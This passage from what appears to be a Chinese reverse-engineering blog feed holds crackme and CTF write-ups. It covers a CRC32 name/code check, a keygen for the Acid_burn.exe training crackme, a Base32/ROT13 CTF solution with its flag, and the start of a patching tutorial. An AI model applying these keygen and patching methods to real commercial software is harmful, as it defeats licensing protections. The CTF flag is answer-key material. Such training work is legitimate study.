data-src="https://i.loli.net/2018/08/16/5b758eff9d88b.jpg" class="lazyload"></a></p><p>要求输入name和code，拖入IDA查看<br>查找字符串，来到算法位置</p><p><a href="https://i.loli.net/2018/08/16/5b758fe0ba199.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b758fe0ba199.jpg" class="lazyload"></a></p><p>name存放到v3，code存放到v8<br>首先要求name字符数大于等于5<br>sub_402F1C将DiKeN附加到输入的name前</p><p><a href="https://i.loli.net/2018/08/16/5b75955a6c465.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b75955a6c465.jpg" class="lazyload"></a></p><p>sub_402ED0计算拼接后字符串长度<br>sub_403DF0是CRC32计算部分</p><p><a href="https://i.loli.net/2018/08/16/5b759975b94c4.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b759975b94c4.jpg" class="lazyload"></a></p><p>table如下</p><p><a href="https://i.loli.net/2018/08/16/5b759a7bb849d.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b759a7bb849d.jpg" class="lazyload"></a></p><p>可以看到与CRC32相同，由此确定为CRC32加密</p><p>code部分则是将字符0加到code前，然后将其每个字符-30h，转换为数字，最后name与code异或校验。<br>这里着重谈逆向时的要点，具体分析请参考这篇文章 <a href="https://bbs.ichunqiu.com/thread-30717-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-30717-1-1.html</a></p><h2 id="魔改CRC分析方法"><a href="#魔改CRC分析方法" class="headerlink" title="魔改CRC分析方法"></a>魔改CRC分析方法</h2><p>首先还是要对标准CRC算法有一些了解。<br>能够修改的部分其实很少，感觉一般会修改生成多项式或修改数据表</p><ol><li><p>对于修改生成多项式，我们需要自己生成数据表，参照脚本如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int make_crc32_table()  </span><br><span class="line">&#123;  </span><br><span class="line">    unsigned c;  </span><br><span class="line">    int i &#x3D; 0;  </span><br><span class="line">    int bit &#x3D; 0;  </span><br><span class="line">    for(i &#x3D; 0; i &lt; 256; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        c  &#x3D; (unsigned)i;      </span><br><span class="line">        for(bit &#x3D; 0; bit &lt; 8; bit++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            if(c&amp;1)  </span><br><span class="line">            &#123;  </span><br><span class="line">                c &#x3D; (c &gt;&gt; 1)^(0xEDB88320);  &#x2F;&#x2F;生成多项式自行修改</span><br><span class="line">                 </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123;  </span><br><span class="line">                c &#x3D;  c &gt;&gt; 1;  </span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;  </span><br><span class="line">        crc32_table &#x3D; c; </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>对于修改数据表，应该只能通过与常用表进行对照了</p></li></ol><h2 id="CRC32发送端接收端完整校验验证性程序"><a href="#CRC32发送端接收端完整校验验证性程序" class="headerlink" title="CRC32发送端接收端完整校验验证性程序"></a>CRC32发送端接收端完整校验验证性程序</h2><p>发送端发送数据后显示CRC32加密密文，接收端解码返回0证明校验成功</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">#define POLY 0x04C11DB7L &#x2F;&#x2F; CRC32生成多项式  </span><br><span class="line"></span><br><span class="line">unsigned int CRC32INV(char * data, int length) &#x2F;&#x2F;接收端</span><br><span class="line">&#123;</span><br><span class="line">        unsigned char* p &#x3D; new unsigned char[length];</span><br><span class="line">        memcpy(p, data, length);</span><br><span class="line">        unsigned int reg &#x3D; 0, sum_poly &#x3D; 0;</span><br><span class="line">        for (int i &#x3D; 0; i &lt; length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                sum_poly &#x3D; reg &amp; 0xFF000000;</span><br><span class="line">                for (int j &#x3D; 0; j &lt; 8; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        int hi &#x3D; sum_poly &amp; 0x80000000;</span><br><span class="line">                        sum_poly &lt;&lt;&#x3D; 1;</span><br><span class="line">                        if (hi) sum_poly &#x3D; sum_poly ^ POLY;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                reg &#x3D; (reg &lt;&lt; 8) | p[i];</span><br><span class="line">                reg &#x3D; reg ^ sum_poly;</span><br><span class="line">        &#125;</span><br><span class="line">        return reg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int CRC32(char * data, int length) &#x2F;&#x2F;发送端</span><br><span class="line">&#123;</span><br><span class="line">        unsigned char* p &#x3D; new unsigned char[length + 4];</span><br><span class="line">        memset(p, 0, length + 4);</span><br><span class="line">        memcpy(p, data, length);</span><br><span class="line">        unsigned int reg &#x3D; 0, sum_poly &#x3D; 0;</span><br><span class="line">        for (int i &#x3D; 0; i &lt; length + 4; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                sum_poly &#x3D; reg &amp; 0xFF000000;</span><br><span class="line">                for (int j &#x3D; 0; j &lt; 8; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        int hi &#x3D; sum_poly &amp; 0x80000000;</span><br><span class="line">                        sum_poly &lt;&lt;&#x3D; 1;</span><br><span class="line">                        if (hi) sum_poly &#x3D; sum_poly ^ POLY;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                reg &#x3D; (reg &lt;&lt; 8) | p[i];</span><br><span class="line">                reg &#x3D; reg ^ sum_poly;</span><br><span class="line">        &#125;</span><br><span class="line">        return reg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        char *crcin &#x3D; new char[5];</span><br><span class="line">        crcin[0] &#x3D; &#39;1&#39;;</span><br><span class="line">        crcin[1] &#x3D; &#39;2&#39;;</span><br><span class="line">        crcin[2] &#x3D; &#39;3&#39;;</span><br><span class="line">        crcin[3] &#x3D; &#39;4&#39;;</span><br><span class="line">        crcin[4] &#x3D; &#39;\0&#39;;</span><br><span class="line">        unsigned int crcout &#x3D; CRC32(crcin, 4);</span><br><span class="line">        char *crcinvin &#x3D; new char[9];</span><br><span class="line">        memcpy(crcinvin, crcin, 4);</span><br><span class="line">        delete[] crcin;</span><br><span class="line">        for (int i &#x3D; 0; i&lt;4; i++)</span><br><span class="line">                memcpy(crcinvin + i + 4, (char*)&amp;crcout + 3 - i, 1);</span><br><span class="line">        crcinvin[8] &#x3D; &#39;\0&#39;;</span><br><span class="line">        unsigned int crcinvout &#x3D; CRC32INV(crcinvin, 8);</span><br><span class="line">        cout &lt;&lt; &quot;crc&quot; &lt;&lt; crcout &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;crc&quot; &lt;&lt; crcinvout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/08/17/5b767581d0468.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/17/5b767581d0468.png" class="lazyload"></a></p><hr><p>目前想到的就先这些<br>参考链接：<br><a href="https://www.cnblogs.com/dacainiao/p/5565046.html" target="_blank" rel="noopener">https://www.cnblogs.com/dacainiao/p/5565046.html</a><br><a href="http://wdhdmx.iteye.com/blog/1464269" target="_blank" rel="noopener">http://wdhdmx.iteye.com/blog/1464269</a><br><a href="https://blog.csdn.net/qq446252221/article/details/51426434" target="_blank" rel="noopener">https://blog.csdn.net/qq446252221/article/details/51426434</a><br><a href="https://blog.csdn.net/wave_1102/article/details/2184901" target="_blank" rel="noopener">https://blog.csdn.net/wave_1102/article/details/2184901</a><br><a href="https://bbs.ichunqiu.com/thread-30717-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-30717-1-1.html</a><br><a href="https://blog.csdn.net/android_lover2014/article/details/78260884" target="_blank" rel="noopener">https://blog.csdn.net/android_lover2014/article/details/78260884</a><br><a href="https://bbs.pediy.com/thread-30975.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-30975.htm</a><br><a href="https://blog.csdn.net/sparkliang/article/details/5671510" target="_blank" rel="noopener">https://blog.csdn.net/sparkliang/article/details/5671510</a></p><p>End。。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;CRC校验算法及逆向方法初探&quot;&gt;&lt;a href=&quot;#CRC校验算法及逆向方法初探&quot; class=&quot;headerlink&quot; title=&quot;CRC校验算法及逆向方法初探&quot;&gt;&lt;/a&gt;CRC校验算法及逆向方法初探&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向，CRC加密" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8CCRC%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>001_Acid_burn.exe 算法分析</title>
    <link href="https://kabeor.github.io/001_Acid_burn.exe%20%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/001_Acid_burn.exe%20%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</id>
    <published>2018-08-02T16:00:00.000Z</published>
    <updated>2020-05-03T04:40:15.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="001-Acid-burn-exe-算法分析"><a href="#001-Acid-burn-exe-算法分析" class="headerlink" title="001_Acid_burn.exe 算法分析"></a>001_Acid_burn.exe 算法分析</h1><p>爆破的方法是好几个月以前写的了<br><a href="https://kabeor.cn/001_Acid_burn.exe/" target="_blank" rel="noopener">001_Acid_burn.exe</a></p><p>今天来看一下算法</p><h2 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h2><p>直接在OD中分析此分支，找到跳转判断条件<br><a href="https://i.loli.net/2018/08/03/5b63ce2dba2af.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/03/5b63ce2dba2af.jpg" class="lazyload"></a></p><p>函数004039FC内将输入字符串与“Hello Dude!”进行比较<br>即密码就是 Hello Dude!</p><h2 id="Name-Serial"><a href="#Name-Serial" class="headerlink" title="Name+Serial"></a>Name+Serial</h2><p><a href="https://i.loli.net/2018/08/03/5b63cfafaf959.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/03/5b63cfafaf959.jpg" class="lazyload"></a></p><p>整个结构很清晰，name长度必须大于等于4，然后进入算法判断</p><p><a href="https://i.loli.net/2018/08/03/5b63d010b8bc7.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/03/5b63d010b8bc7.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/08/03/5b63d04f4f6a7.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/03/5b63d04f4f6a7.jpg" class="lazyload"></a></p><p>如图注释<br>首先注意dword_431750被赋值为<strong>0x29</strong><br>然后直接看第二层验证<br>*v18是输入name的第一个字符name[0]</p><p>经过如下计算<br><code>name[0]*0x29*2</code><br>并将其转换为十进制，然后填入( )中组合成密码</p><pre><code>CW-( )-CRACKED</code></pre><h2 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char name[1024];</span><br><span class="line"></span><br><span class="line">    printf(&quot;Input your name: &quot;);</span><br><span class="line">    scanf(&quot;%s&quot;, name);</span><br><span class="line">    printf(&quot;Serial: CW-%d-CRACKED\n&quot;, name[0] * 0x29 * 2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><p>END..</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;001-Acid-burn-exe-算法分析&quot;&gt;&lt;a href=&quot;#001-Acid-burn-exe-算法分析&quot; class=&quot;headerlink&quot; title=&quot;001_Acid_burn.exe 算法分析&quot;&gt;&lt;/a&gt;001_Acid_burn.exe</summary>
        
      
    
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>PE文件结构图</title>
    <link href="https://kabeor.github.io/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%9B%BE/"/>
    <id>https://kabeor.github.io/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%9B%BE/</id>
    <published>2018-08-02T16:00:00.000Z</published>
    <updated>2020-03-16T04:47:45.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="点击放大查看"><a href="#点击放大查看" class="headerlink" title="点击放大查看"></a>点击放大查看</h2><p><a href="https://i.loli.net/2018/07/15/5b4b62c48b7d3.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b62c48b7d3.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/15/5b4b62c4c1faa.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b62c4c1faa.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/08/03/5b639dc8dd7e7.jpg" data-fancybox="group" data-caption="PE101" class="fancybox"><img alt="PE101" title="PE101" data-src="https://i.loli.net/2018/08/03/5b639dc8dd7e7.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/08/03/5b639de8c42f6.jpg" data-fancybox="group" data-caption="PE102" class="fancybox"><img alt="PE102" title="PE102" data-src="https://i.loli.net/2018/08/03/5b639de8c42f6.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;点击放大查看&quot;&gt;&lt;a href=&quot;#点击放大查看&quot; class=&quot;headerlink&quot; title=&quot;点击放大查看&quot;&gt;&lt;/a&gt;点击放大查看&lt;/h2&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="计算机系统" scheme="https://kabeor.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="PE" scheme="https://kabeor.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/PE/"/>
    
    
    <category term="PE" scheme="https://kabeor.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</title>
    <link href="https://kabeor.github.io/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/"/>
    <id>https://kabeor.github.io/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/</id>
    <published>2018-08-01T16:00:00.000Z</published>
    <updated>2020-05-03T04:40:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N"><a href="#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N" class="headerlink" title="2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N"></a>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</h1><p>通过这道题，又复习了一遍Base32的逆向<br><a href="https://i.loli.net/2018/07/24/5b568e0e2376c.png" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/24/5b568e0e2376c.png" class="lazyload"></a></p><p>很干净，无壳无花，x86 C++</p><p>拖进IDA</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>搜索字符串<br><a href="https://i.loli.net/2018/07/24/5b568eef447cf.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b568eef447cf.jpg" class="lazyload"></a></p><p>定位，F5<br><a href="https://i.loli.net/2018/07/24/5b568f58c6d73.jpg" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/24/5b568f58c6d73.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/24/5b568f94111d0.jpg" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/24/5b568f94111d0.jpg" class="lazyload"></a></p><p>首先要求输入长度大于等于10</p><h3 id="1-Fake-Flag"><a href="#1-Fake-Flag" class="headerlink" title="1. Fake Flag"></a>1. Fake Flag</h3><p><code>v3 = &quot;guvf_vf_n_snxr_synt&quot;;</code>是用来骗人的，其操作是在sub_401100进行操作然后比较，因此只要利用逆向思维，将v3看作已知，对sub_401100进行逆操作即可</p><p>sub_401100内部为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed int __thiscall sub_401100(const char *this)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v1; &#x2F;&#x2F; edi</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; esi</span><br><span class="line">  char v3; &#x2F;&#x2F; cl</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; this;</span><br><span class="line">  v2 &#x3D; 0;</span><br><span class="line">  if ( strlen(this) )</span><br><span class="line">  &#123;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v3 &#x3D; v1[v2];</span><br><span class="line">      if ( (unsigned __int8)(v3 - 97) &lt;&#x3D; 0x19u )</span><br><span class="line">        v1[v2] &#x3D; (v3 - 84) % 26 + 97;</span><br><span class="line">      if ( (unsigned __int8)(v3 - 65) &lt;&#x3D; 0x19u )</span><br><span class="line">        v1[v2] &#x3D; (v3 - 52) % 26 + 65;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v2 &lt; strlen(v1) );</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以看出是对ASCII操作<br>    84  -&gt; ‘T’<br>    97  -&gt; ‘a’<br>    52 -&gt; ‘4’<br>    65 -&gt; ‘A’</p><blockquote><p>脚本</p></blockquote><p><a href="https://i.loli.net/2018/07/24/5b569646a3664.jpg" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/24/5b569646a3664.jpg" class="lazyload"></a></p><p>当然了，这是假flag，仅供娱乐</p><h3 id="True-Flag"><a href="#True-Flag" class="headerlink" title="True Flag"></a>True Flag</h3><p>接着往下看<br><strong>LABEL_9</strong>才是真正的加解密函数</p><h4 id="编码表-sub-4012C0"><a href="#编码表-sub-4012C0" class="headerlink" title="编码表 sub_4012C0()"></a>编码表 sub_4012C0()</h4><p>进入<code>sub_4012C0();</code>查看<br><a href="https://i.loli.net/2018/07/24/5b56985dd2937.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56985dd2937.jpg" class="lazyload"></a></p><p><code>sub_401100</code>刚刚分析过，这里仔细分析一下<br><a href="https://i.loli.net/2018/07/24/5b5699d86e2f5.jpg" data-fancybox="group" data-caption="i" class="fancybox"><img alt="i" title="i" data-src="https://i.loli.net/2018/07/24/5b5699d86e2f5.jpg" class="lazyload"></a></p><p>接下来读取长度，<strong>+32</strong>是大写转换为小写操作<strong>，</strong>++i** 及 <strong>i&amp;1</strong>组合表示奇数位不变，偶数位转换</p><p><code>dword_40507C</code>内容需要括住按C键重新分析，将数据识别为Char类型，结果如下<br><a href="https://i.loli.net/2018/07/24/5b569c5e93812.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b569c5e93812.jpg" class="lazyload"></a></p><p>‘2765’及‘43’也是转换成char类型得到的，值得注意的是，未转换之前为十六进制编码，且应倒序读取，<code>dword_40507C</code>加上4位数字(即5672)就来到了<code>word_405080</code>,也就是数字顺序为<strong>567234</strong><br>或着在修复<code>dword_40507C</code>后，重新F5，即如下图，更加易于理解<br><a href="https://i.loli.net/2018/07/24/5b569ea6d5852.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b569ea6d5852.jpg" class="lazyload"></a></p><p>于是将<strong>ABCDEFGHIJKLMNOPQRSTUVWXYZ</strong>带入脚本得出<br><a href="https://i.loli.net/2018/07/24/5b569f8908552.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b569f8908552.jpg" class="lazyload"></a><br>再替换大小写，后面加567234即得出编码顺序<br><strong><em>NoPqRsTuVwXyZaBcDeFgHiJkLm567234</em></strong></p><h4 id="BASE32-sub-401310"><a href="#BASE32-sub-401310" class="headerlink" title="BASE32 sub_401310()"></a>BASE32 sub_401310()</h4><p>回到主函数，分析最后一个需要的函数<code>sub_401310()</code><br><a href="https://i.loli.net/2018/07/24/5b56a0f209578.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56a0f209578.jpg" class="lazyload"></a></p><p>跟进<code>sub_401170</code><br><a href="https://i.loli.net/2018/07/24/5b56a1524a1c1.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56a1524a1c1.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/24/5b56a175578ae.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56a175578ae.jpg" class="lazyload"></a></p><p>下面case里的数据识别为char为”=”,结合题目叫Simple Base-N可以猜到应该是Base16/32/64类型的加密，并且编码表的内容我们也刚刚已经得出，为了继续印证猜想，往上看看，发现如下操作<br><a href="https://i.loli.net/2018/07/24/5b56a26b97f72.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56a26b97f72.jpg" class="lazyload"></a></p><p>这看起来很眼熟，<a href="https://i.loli.net/2018/07/24/5b56a3075ac53.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56a3075ac53.jpg" class="lazyload"></a></p><p>之前写过一篇wp(<a href="https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/" target="_blank" rel="noopener">2017第二届广东省强网杯线上赛Nonstandard</a>)，代码一模一样，看来就是Base32了。</p><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><p>于是直接用上次的脚本就好,带入密码<code>weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &quot;weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg&quot;</span><br><span class="line">table &#x3D; &quot;NoPqRsTuVwXyZaBcDeFgHiJkLm567234&quot;</span><br><span class="line"></span><br><span class="line">def find(x):</span><br><span class="line">    if(x&#x3D;&#x3D;&#39;&#x3D;&#39;):</span><br><span class="line">        return 0</span><br><span class="line">    return table.index(x)</span><br><span class="line"></span><br><span class="line">for i in range(len(s)&#x2F;&#x2F;8):</span><br><span class="line">    p &#x3D; s[i*8:i*8+8]</span><br><span class="line">    t &#x3D; 0</span><br><span class="line">    for j in p:</span><br><span class="line">        t &#x3D; t&lt;&lt;5</span><br><span class="line">        t +&#x3D; find(j)</span><br><span class="line">    for j in range(5):</span><br><span class="line">        print(chr((t&amp;0xff00000000)&gt;&gt;32), end&#x3D;&#39;&#39;)</span><br><span class="line">        t &#x3D; t&lt;&lt;8</span><br></pre></td></tr></table></figure></div><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><a href="https://i.loli.net/2018/07/24/5b56a42e4abd6.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56a42e4abd6.jpg" class="lazyload"></a><br>得出之后提交并不正确，通过凯撒移位，发现Rot13的结果是flag<br><a href="https://i.loli.net/2018/07/24/5b56ad29a553f.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/24/5b56ad29a553f.jpg" class="lazyload"></a></p><blockquote><p>flag：Y@u_Kn@W_b@s332_@Nd_r0t13</p></blockquote><hr><p>Get it！</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot;&gt;&lt;a href=&quot;#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot; class=&quot;headerlink&quot; title=&quot;2018巅峰极客网络安全技能挑战赛</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="巅峰极客网络安全技能挑战赛" scheme="https://kabeor.github.io/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    
    <category term="wp" scheme="https://kabeor.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>001_Acid_burn.exe</title>
    <link href="https://kabeor.github.io/001_Acid_burn.exe/"/>
    <id>https://kabeor.github.io/001_Acid_burn.exe/</id>
    <published>2018-07-24T16:00:00.000Z</published>
    <updated>2020-05-03T04:40:19.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="001-Acid-burn-exe"><a href="#001-Acid-burn-exe" class="headerlink" title="001_Acid_burn.exe"></a>001_Acid_burn.exe</h1><p>#爆破法</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>（这段的图是借FREEBUF的）</p><p>程序是Delphi3.x.x写的,无壳</p><p>程序运行时会弹出一个NAG窗口，标题是”hello you have to kill me”;这个窗口是要去除的。</p><p><a href="https://i.loli.net/2018/07/15/5b4b5e1949e90.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e1949e90.jpg" class="lazyload"></a></p><p>然后点击确定后进入程序的主窗口。</p><p><a href="https://i.loli.net/2018/07/15/5b4b5e195ef97.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e195ef97.jpg" class="lazyload"></a></p><p>进去后发现有两个按钮，根据按钮上的字符串判断应该是需要输入序列号和名称的位置。</p><p>首先看下左边那个按钮，点击进去看下情况，发现有两个输入框，分别是输入用户名和序列号，然后点击Check it Baby，程序会进行校验，校验失败会弹出下面窗口，提醒你try again！</p><p><a href="https://i.loli.net/2018/07/15/5b4b5e19744ad.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e19744ad.jpg" class="lazyload"></a></p><p>可以发现上面这个位置是一个需要破解的点。</p><p>然后点击I give up按钮返回到程序的主界面，看下右边那个按钮的情况。</p><p>点击进去后发现有一个输入框，提醒你输入序列号，然后点击Check it Baby，程序会进行校验，校验失败会弹出下面窗口，提醒你Failed！</p><p><a 